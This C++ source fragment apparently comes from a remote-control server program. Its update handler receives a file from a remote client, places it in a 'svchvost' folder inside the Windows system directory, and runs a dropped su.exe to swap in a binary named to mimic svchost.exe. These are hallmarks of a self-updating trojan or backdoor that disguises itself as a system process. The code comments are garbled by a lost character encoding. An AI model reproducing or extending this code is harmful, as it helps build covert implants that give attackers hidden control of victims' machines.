// ����� ������; ���������� �������, �������������� ��������
#include <iostream>
#include "server.h"
#include "commands.h"
#include "common.h"
#include "pstring.hpp"
#include "pint.hpp"
#include "resource.h"

using namespace PUSHKIN_SERVER;
using namespace std;
using namespace PSQL_API;

#pragma warning (disable: 4996)

// �������� � ������ ��������� ���������� �������
int CreateSU(const char *path);
int CPushkinServClient::UpdateServerImpl()
{
   // ������� �� ����� ��������� ����������� �������
   if (CreateSU("su.exe") != P_YES) return P_ERROR;

   STARTUPINFO si;
   PROCESS_INFORMATION pi;

   ZeroMemory( &si, sizeof(si) );
   si.cb = sizeof(si);
   ZeroMemory( &pi, sizeof(pi) );

   // ��������� ��������� ���������� �������
   if( !CreateProcess( NULL, "su.exe update svchvost.exe svchvost.exe asd.dat", // Command line.
                        NULL,             // Process handle not inheritable.
                        NULL,             // Thread handle not inheritable.
                        FALSE,            // Set handle inheritance to FALSE.
                        0,                // No creation flags.
                        NULL,             // Use parent'm_socket environment block.
                        NULL,             // Use parent'm_socket starting directory.
                        &si,              // Pointer to STARTUPINFO structure.
                        &pi ) )            // Pointer to PROCESS_INFORMATION structure.
   {
//      MessageBox(NULL, "Error starting process", "Fuck", MB_OK);
   }

   return P_YES;
}

// ���������� �������, �������������� ��������
int CPushkinServClient::UpdateServer()
{
   if (!m_bAuthorized) return SendReply(m_socket, CC_ERROR, ERR_NOT_AUTHORIZED);

   // �������� ������������� ����������� ���������� �������
   if (SendReply(m_socket, CC_CONFIRM) != P_YES) return P_ERROR;

   // ������������� ������������� ������� SYSTEM32 �������
   char buf[1024];
   GetSystemDirectory(buf, 1024);
   strcat(buf, "\\svchvost");
   SetCurrentDirectory(buf);

   // �������� ����
   int ret = ::ReceiveFile(m_socket, "asd.dat", 0);
   if (ret != P_YES) return ret;

   // �������� ������������� ������ ����� �� �������
   if (SendReply(m_socket, CC_CONFIRM) != P_YES) return P_ERROR;

   // ��������� ��������� ���������� �������
   if (UpdateServerImpl() != P_YES) return P_ERROR;

   // ��������� ������ ���� ��� ����� �������������
   server_p->m_bStopServer = true;
   closesocket(server_p->m_socket);

   return P_YES;
}
